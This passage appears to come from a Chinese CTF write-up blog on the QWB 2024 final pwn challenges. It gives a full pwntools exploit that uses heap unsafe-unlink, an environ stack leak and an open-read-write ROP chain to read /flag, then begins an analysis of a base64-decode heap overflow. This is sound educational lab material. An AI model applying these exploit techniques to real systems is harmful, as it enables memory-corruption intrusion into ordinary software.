class="line">add(<span class="number">7</span>,decrypt(<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x20</span>))</span><br><span class="line">book=code_base+<span class="number">0x4080</span> </span><br><span class="line">edit(<span class="number">3</span>,decrypt(p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(book+<span class="number">0x18</span>-<span class="number">0x18</span>)+p64(book+<span class="number">0x18</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>))<span class="comment">#+p64(0x30)+p64(0xc0)))</span></span><br><span class="line">edit(<span class="number">14</span>,decrypt(p64(<span class="number">0x30</span>)+p64(<span class="number">0xc0</span>)))</span><br><span class="line">free(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>结果如下</p><img src="/2024/12/08/qwb2024_final/13.png" class=""><p>在这里，我分配了一个0x40的堆块，返回了 <code>0x55555555c350</code> 这个指针，通过堆重叠，在 0x40 的堆块里面包含了一个 0x30 的堆块，可以发现 0x40 指向分配给用户的指针指向了 0x30 这个堆块的头部，这是我们伪造的一个 fake chunk，这里其实不需要加 0x31 这个size，因为 unlink不检查这个size，这里写 0x31 主要是方便理解。</p><p>同时它的 fd 和 bk，分别赋值了 <code>0x0000555555558080</code> 和 <code>0x0000555555558088</code>，这个值其实就是因为我们伪造的堆块得到了一个指向头部的指针在 BookList 全局数组当中，因此上面的等式中的 &amp;p 就有了，不难发现 <code>&amp;p = 0x555555558090</code>，那么根据前面的 x 和 y 相关方程可得 <code>x=0x0000555555558080</code>，<code>y=0x0000555555558088</code>，分别对应了这里的 fd 和 bk 的位置。</p><p>最后需要伪造 prevsize 为 0x30 和将 size 的prev_inuse设置为0，才能够成功触发 unsafe unlink。</p><p>触发了 unsafe unlink 之后，可以发现，BookList[3] 得到了一个指向自身 - 0x18 的位置，同时合并堆块的操作也是成功的，这里大小为 0x421 是因为后面还有 free 块，向前也合并了。</p><img src="/2024/12/08/qwb2024_final/14.png" class=""><p>有了这个指针，可以任意修改 BookList[0]的值，再通过 BookList[0] 指针取读写任意的地址。此刻，malloc 已经不被需要了，我已然是无敌的状态。</p><p>这里选择劫持通过 <code>__environ</code> 泄露栈，用栈迁移劫持栈到堆上，在堆上提前布置好 ROP 链进行 ORW 即可。</p><p>想必也是可以一气呵成了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">3</span>,decrypt(p64(code_base+<span class="number">0x4100</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>])))</span><br><span class="line"><span class="comment">#edit(0,decrypt(p32(0x10)*4))</span></span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0x10</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">res=encrypt(p.recv(<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(res.<span class="built_in">hex</span>())</span><br><span class="line">stack=u64(res[:<span class="number">8</span>])-<span class="number">0x138</span></span><br><span class="line">success(<span class="string">&#x27;stack: &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(4,decrypt(b&#x27;a&#x27;*0x20))</span></span><br><span class="line">leave=code_base+<span class="number">0x1AA4</span></span><br><span class="line">pop_rdi=libc_addr+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi=libc_addr+<span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret_10=libc_addr+<span class="number">0x00000000000dfc12</span></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0xa0</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#add(4,decrypt(p64(pop_rdi)))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x4350</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x360</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(heap_addr+<span class="number">0x4350</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;open&#x27;</span>])+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x390</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap_addr)+p64(pop_rdx_ret_10)+p64(<span class="number">0x30</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3c0</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(libc_addr+libc.sym[<span class="string">&#x27;read&#x27;</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3e0</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(heap_addr)+p64(pop_rdx_ret_10)+p64(<span class="number">0x30</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3e0</span>+<span class="number">0x30</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(libc_addr+libc.sym[<span class="string">&#x27;write&#x27;</span>])+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(stack))</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x555555555aa4&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x358</span>)+p64(leave)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>至此，已成艺术</p><img src="/2024/12/08/qwb2024_final/15.png" class=""><h3 id="最终-EXP"><a href="#最终-EXP" class="headerlink" title="最终 EXP"></a>最终 EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">    key=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line">    key=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(data)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./heap&#x27;</span>,aslr=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;47.94.85.95&#x27;,28760)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/xia0ji233/pwn/tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\nP&#x27;</span>)[-<span class="number">8</span>:-<span class="number">2</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1233</span></span><br><span class="line">success(<span class="string">&#x27;code_base: &#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">6</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p8(<span class="number">0xa0</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">data=p.recv(<span class="number">16</span>)</span><br><span class="line">res=encrypt(data)</span><br><span class="line">heap_addr=u64(res[<span class="number">8</span>:])-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr: &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,decrypt(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x431</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>)[:<span class="number">48</span>])</span><br><span class="line">add(<span class="number">14</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x350</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">data=p.recv(<span class="number">32</span>)</span><br><span class="line">res=encrypt(data)</span><br><span class="line"><span class="comment">#print(res.hex())</span></span><br><span class="line">libc_addr=u64(res[<span class="number">8</span>*<span class="number">3</span>:<span class="number">8</span>*<span class="number">4</span>])-<span class="number">0x215be0</span>+<span class="number">0x029000</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,decrypt(<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x20</span>))</span><br><span class="line">book=code_base+<span class="number">0x4080</span> </span><br><span class="line">edit(<span class="number">3</span>,decrypt(p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(book+<span class="number">0x18</span>-<span class="number">0x18</span>)+p64(book+<span class="number">0x18</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>))<span class="comment">#+p64(0x30)+p64(0xc0)))</span></span><br><span class="line">edit(<span class="number">14</span>,decrypt(p64(<span class="number">0x30</span>)+p64(<span class="number">0xc0</span>)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,decrypt(p64(code_base+<span class="number">0x4100</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>])))</span><br><span class="line"><span class="comment">#edit(0,decrypt(p32(0x10)*4))</span></span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0x10</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">res=encrypt(p.recv(<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(res.<span class="built_in">hex</span>())</span><br><span class="line">stack=u64(res[:<span class="number">8</span>])-<span class="number">0x138</span></span><br><span class="line">success(<span class="string">&#x27;stack: &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(4,decrypt(b&#x27;a&#x27;*0x20))</span></span><br><span class="line">leave=code_base+<span class="number">0x1AA4</span></span><br><span class="line">pop_rdi=libc_addr+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi=libc_addr+<span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret_10=libc_addr+<span class="number">0x00000000000dfc12</span></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0xa0</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#add(4,decrypt(p64(pop_rdi)))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x4350</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x360</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(heap_addr+<span class="number">0x4350</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;open&#x27;</span>])+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x390</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap_addr)+p64(pop_rdx_ret_10)+p64(<span class="number">0x30</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3c0</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(libc_addr+libc.sym[<span class="string">&#x27;read&#x27;</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3e0</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(heap_addr)+p64(pop_rdx_ret_10)+p64(<span class="number">0x30</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3e0</span>+<span class="number">0x30</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(libc_addr+libc.sym[<span class="string">&#x27;write&#x27;</span>])+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(stack))</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x555555555aa4&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x358</span>)+p64(leave)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里插个题外话，可能纯做 Pwn 的师傅不太清楚，Crypto 这个库安装使用以下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install cryptodome</span><br></pre></td></tr></table></figure><h2 id="ez-heap"><a href="#ez-heap" class="headerlink" title="ez_heap"></a>ez_heap</h2><p><a href="ez_heap_c39239d7dd7612062b2f9a864512e346.zip">附件下载</a></p><p>环境准备就不过多赘述了，道理都是一样的。</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>堆菜单实现了存储 base64 编码和解码的增删查，虽然说菜单上看着有改的操作，也确实有对应的函数，但是没有实装。</p><img src="/2024/12/08/qwb2024_final/16.png" class=""><p>同样的，也来分析这些函数。</p><h4 id="base64编码增"><a href="#base64编码增" class="headerlink" title="base64编码增"></a>base64编码增</h4><img src="/2024/12/08/qwb2024_final/17.png" class=""><p>根据输入的长度和回车的判断，去分配堆块，而这里分配的长度是 <code>4*len/3 + 4</code>，还算是留有余地，几乎不能够溢出。</p><h4 id="base64解码增"><a href="#base64解码增" class="headerlink" title="base64解码增"></a>base64解码增</h4><img src="/2024/12/08/qwb2024_final/18.png" class=""><p>这里需要注意的点来了，它这里分配的长度是 <code>3*len/4</code>，这个长度比较极限但是它如果强制要求你的 len 必须是 4 的倍数其实也不能利用，但是没有，所以这里打个 tag，后续着重分析这里的解码函数。</p><h4 id="base64编码删"><a href="#base64编码删" class="headerlink" title="base64编码删"></a>base64编码删</h4><img src="/2024/12/08/qwb2024_final/19.png" class=""><p>删不存在 UAF。</p><hr><p>后面的base64解码删，和输出堆块就不一一演示了，都很正常的实现。</p><p>这里想起之前讲到的 base64 解码增，来看看解码函数的实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">base64decode</span><span class="params">(<span class="type">char</span> *a1, <span class="type">unsigned</span> __int64 len, <span class="type">char</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//一大堆定义</span></span><br><span class="line">  v16 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v16 &gt;= len )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    *a3 = ((v15 &lt;&lt; <span class="number">6</span>) + (v14 &lt;&lt; <span class="number">12</span>) + (v13 &lt;&lt; <span class="number">18</span>) + v9) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    a3[<span class="number">1</span>] = ((v15 &lt;&lt; <span class="number">6</span>) + (v14 &lt;&lt; <span class="number">12</span>) + v9) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    a3[<span class="number">2</span>] = (v15 &lt;&lt; <span class="number">6</span>) + v9;</span><br><span class="line">    a3 += <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把中间一大段去掉，保留收尾，可以发现循环条件是 v16&gt;&#x3D;len，而 a3 的输出指针每次 +3，因此这个函数在输入长度为 4 的倍数的时候是绝对好使的，但是输入是由我们控制的，因此长度可以不为 4 的倍数，而不为 4 的倍数可能会导致分配的空间不够从而导致溢出。</p><h3 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>首先进行漏洞的验证。</p><p>交互函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter your choice: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free1</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free2</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show2</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">8</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure><p>首先看看编码一个 0x19 长度的字符串，但是去掉编码后的最后一个字节，我们来计算一下。</p><p>0x19 长度的字符编码之后应该是 0x24 字节，去掉一个字节变成 0x23 字节，然后这个长度进入选项 2，malloc 的参数为 <code>0x23/4*3</code>，即得到 0x18，所以最终分配得到 0x20 大小的 <code>chunk</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x19</span>)[:-<span class="number">1</span>])<span class="comment">#0</span></span><br></pre></td></tr></table></figure><p>可以发现，最终的 top chunk 的 size 明显出了问题</p><img src="/2024/12/08/qwb2024_final/20.png" class=""><p>需要分析一下为什么出现了 410061 这样奇怪的值，图中可以看出来我的输入是 <code>YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQ=</code>，最小化之后发现主要的问题就是 <code>YQ=</code> 解析成了 <code>61 00 41</code> 这样的字节，来看看原理。</p><p><code>YQ</code> 解析成第一个 <code>a</code> 不奇怪，<code>Q=</code> 解析出第二个 <code>00</code> 也不奇怪，这个 <code>=</code> 和另外一个字节（0字节）解析成了 <code>A</code>，来看看为什么。</p><p>看到对最后一个字节的解析</p><img src="/2024/12/08/qwb2024_final/21.png" class=""><p>它使用 <code>strchr</code> 去查找该字符串在 base 表所处的位置，对于这个函数来说，如果如果找到了则返回该字符的指针，如果找不到返回 NULL，而找零字节能不能找到呢？能！就在字符串最后面，所有字符串都是 0 结尾的，所以找到的末尾指针减去首指针得到了 0x41，而 &#x3D; 又等同于 0，因此看到 <code>a[2]=(v15&lt;&lt;6)+v9</code>，也能理所当然地知道为啥是 <code>A</code> 了。</p><p>但是这样不太自由，因为会写 size 三个字节，因此可以考虑扩展长度，让它只能溢出一个 A 字节，这样这个 A 就能被覆盖到 size 里面构造堆重叠，然后打 tcache bin attack劫持 free hook就行了。</p><hr><p>所以还是先泄露地址，这里虽然限制了 0x400，但是别忘了 base64编码可以扩展长度，因此很轻松构造一个unsorted bin来泄露地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add1(<span 